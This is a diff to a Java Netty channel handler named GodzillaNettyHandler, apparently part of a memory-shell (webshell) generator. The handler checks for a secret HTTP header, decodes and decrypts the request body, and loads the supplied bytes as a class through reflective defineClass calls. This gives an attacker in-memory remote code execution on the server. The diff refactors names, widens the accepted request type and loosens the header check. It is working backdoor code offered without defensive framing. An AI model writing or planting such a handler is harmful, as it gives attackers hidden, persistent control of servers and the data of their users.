@@ -18,6 +18,9 @@ import java.net.URLClassLoader;
 import java.net.URLDecoder;
 import java.nio.charset.StandardCharsets;
 
+/**
+ * @author ReaJason
+ */
 @ChannelHandler.Sharable
 public class GodzillaNettyHandler extends ChannelDuplexHandler {
     public static String key;
@@ -25,15 +28,15 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
     public static String md5;
     public static String headerName;
     public static String headerValue;
-    private StringBuilder requestBody = new StringBuilder();
-    private DefaultHttpRequest request;
+    private final StringBuilder requestBody = new StringBuilder();
+    private HttpRequest request;
     private static Class<?> payload;
 
-    private static Class<?> defClass(byte[] classbytes) throws Exception {
+    private static Class<?> defineClass(byte[] bytes) throws Exception {
         URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
         Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         method.setAccessible(true);
-        return (Class<?>) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
+        return (Class<?>) method.invoke(urlClassLoader, bytes, 0, bytes.length);
     }
 
     public byte[] x(byte[] s, boolean m) {
@@ -48,11 +51,11 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
 
     @Override
     public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
-        if (msg instanceof DefaultHttpRequest) {
-            request = (DefaultHttpRequest) msg;
+        if (msg instanceof HttpRequest) {
+            request = (HttpRequest) msg;
             HttpHeaders headers = request.headers();
             String value = headers.get(headerName);
-            if (value == null || !value.equals(headerValue)) {
+            if (value == null || !value.contains(headerValue)) {
                 ctx.fireChannelRead(msg);
                 return;
             }
@@ -64,7 +67,7 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
             String value = headers.get(headerName);
 
             // quick fail，防止其他哥斯拉马打进来走这个逻辑寄了
-            if (value == null || !value.equals(headerValue)) {
+            if (value == null || !value.contains(headerValue)) {
                 ctx.fireChannelRead(msg);
                 return;
             }
@@ -77,7 +80,7 @@ public class GodzillaNettyHandler extends ChannelDuplexHandler {
                     requestBody.setLength(0);
                     byte[] data = x(base64Decode(base64Str), false);
                     if (payload == null) {
-                        payload = defClass(data);
+                        payload = defineClass(data);
                         send(ctx, "");
                         return;
                     } else {
